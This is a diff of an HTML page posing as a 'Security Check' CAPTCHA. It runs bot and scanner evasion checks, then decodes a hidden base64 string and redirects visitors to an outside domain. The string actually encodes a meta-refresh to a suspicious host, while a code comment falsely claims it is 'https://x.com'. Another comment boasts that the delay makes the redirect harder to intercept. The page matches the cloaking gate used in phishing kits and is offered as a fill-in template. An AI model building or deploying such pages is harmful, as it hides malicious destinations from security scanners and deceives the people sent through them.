@@ -2,18 +2,18 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Security Check</title>
+  <title>Human Verification</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 100px;
-      background-color: #f2f2f2;
+      background: #f9f9f9;
     }
     input, button {
       font-size: 16px;
       padding: 10px;
-      margin: 10px;
+      margin-top: 10px;
     }
     #redirect-message {
       display: none;
@@ -23,17 +23,18 @@
   </style>
 </head>
 <body>
-  <h2>Verify You're Human</h2>
-  <p id="captcha-question">Loading challenge...</p>
-  <input type="number" id="captcha-answer" placeholder="Enter answer" />
+  <h2>Security Check</h2>
+  <p id="captcha-question">Loading CAPTCHA...</p>
+  <input type="number" id="captcha-answer" placeholder="Your answer">
   <br>
-  <button onclick="verifyCaptcha()">Submit</button>
-  <p id="redirect-message">Redirecting, please wait...</p>
-
-  <!-- Hidden base64 link -->
-  <a id="secret-link" href="JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U=" style="display: none;"></a>
+  <button onclick="submitCaptcha()">Verify & Continue</button>
+  <p id="redirect-message">Redirecting...</p>
 
   <script>
+    // 👇 PLACE YOUR BASE64 URL HERE
+    let ref = "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd29ya2luZ3dva2Vycy5mZW5tZW5vcy5kZS9iYzBRUCUyMiUyMC8lM0U="; // Base64 for https://x.com
+
+    // CAPTCHA and bot detection
     let num1, num2;
     let mouseMoved = false;
     const startTime = Date.now();
@@ -43,56 +44,60 @@
       mouseMoved = true;
     });
 
-    // Generate a new CAPTCHA each load
+    // Basic behavioral & environment check
+    function isHumanLike() {
+      return (
+        navigator.userAgent.length > 20 &&
+        'language' in navigator &&
+        'platform' in navigator &&
+        screen.width > 0 &&
+        screen.height > 0 &&
+        window.innerWidth > 0 &&
+        typeof window.DeviceOrientationEvent !== 'undefined'
+      );
+    }
+
+    // CAPTCHA generator
     function generateCaptcha() {
       num1 = Math.floor(Math.random() * 10) + 1;
       num2 = Math.floor(Math.random() * 10) + 1;
       document.getElementById("captcha-question").innerText = `What is ${num1} + ${num2}?`;
     }
 
-    // Bot detection
-    function isHumanLikeBrowser() {
-      return (
-        navigator.userAgent.length > 20 &&
-        screen.width > 0 &&
-        screen.height > 0 &&
-        typeof window.DeviceOrientationEvent !== "undefined" &&
-        'language' in navigator &&
-        'platform' in navigator &&
-        window.innerWidth > 0
-      );
-    }
-
-    function verifyCaptcha() {
-      const userAnswer = parseInt(document.getElementById("captcha-answer").value, 10);
-      const timeElapsed = Date.now() - startTime;
+    // Submit handler
+    function submitCaptcha() {
+      const answer = parseInt(document.getElementById("captcha-answer").value, 10);
+      const elapsed = Date.now() - startTime;
 
       if (
-        userAnswer === (num1 + num2) &&
         mouseMoved &&
-        isHumanLikeBrowser() &&
-        timeElapsed > 1500
+        isHumanLike() &&
+        answer === (num1 + num2) &&
+        elapsed > 1500
       ) {
         document.getElementById("redirect-message").style.display = "block";
+
+        // Short delay before redirect to make it harder to intercept in real-time
         setTimeout(() => {
-          const encodedHref = document.getElementById("secret-link").getAttribute("href");
           try {
-            const decoded = atob(encodedHref);
-            window.location.href = decoded;
-          } catch (e) {
-            alert("Redirect failed. Invalid link.");
+            const url = atob(ref);
+            if (url.startsWith("http")) {
+              window.location.href = url;
+            } else {
+              alert("Invalid redirect link.");
+            }
+          } catch (err) {
+            alert("Error decoding the redirect URL.");
           }
         }, 1000);
       } else {
-        alert("Verification failed. Try again.");
+        alert("Failed verification. Try again.");
         document.getElementById("captcha-answer").value = "";
         generateCaptcha();
       }
     }
 
-    window.onload = () => {
-      generateCaptcha();
-    };
+    window.onload = generateCaptcha;
   </script>
 </body>
 </html>
